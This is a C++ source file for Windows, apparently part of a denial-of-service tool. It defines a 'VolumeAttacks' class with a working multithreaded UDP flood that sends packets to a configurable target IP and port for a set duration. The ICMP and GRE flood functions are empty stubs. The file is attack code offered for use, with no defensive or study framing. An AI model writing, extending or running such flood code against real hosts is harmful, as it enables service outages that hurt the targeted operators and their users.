#include "volume.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <iostream>
#include <thread>
#include <atomic>
#include <vector>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

void VolumeAttacks::runVolumeAttack(TargetConfig& target, AttackParams& params) {
    if (target.protocol == "udp") {
        udpFlood(target, params);
    } else if (target.protocol == "icmp") {
        icmpFlood(target, params);
    } else if (target.protocol == "gre") {
        greFlood(target, params);
    }
}

void VolumeAttacks::udpFlood(TargetConfig& target, AttackParams& params) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        return;
    }
    
    sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target.port);
    inet_pton(AF_INET, target.ip.c_str(), &dest.sin_addr);
    
    std::vector<char> payload(params.packet_size, 'X');
    std::atomic<int> packets_sent(0);
    
    auto start = std::chrono::steady_clock::now();
    auto end = start + std::chrono::seconds(params.duration);
    
    std::vector<std::thread> threads;
    for (int i = 0; i < params.threads; i++) {
        threads.emplace_back([&]() {
            while (std::chrono::steady_clock::now() < end && 
                  (params.packet_count == 0 || packets_sent < params.packet_count)) {
                sendto(sock, payload.data(), payload.size(), 0, 
                      (sockaddr*)&dest, sizeof(dest));
                packets_sent++;
            }
        });
    }
    
    for (auto& t : threads) {
        t.join();
    }
    
    closesocket(sock);
    WSACleanup();
    std::cout << "UDP Flood completed. Packets sent: " << packets_sent << std::endl;
}

void VolumeAttacks::icmpFlood(TargetConfig& target, AttackParams& params) {
    // ICMP implementation similar to UDP
    // ...
}

void VolumeAttacks::greFlood(TargetConfig& target, AttackParams& params) {
    // GRE flood implementation
    // ...
}
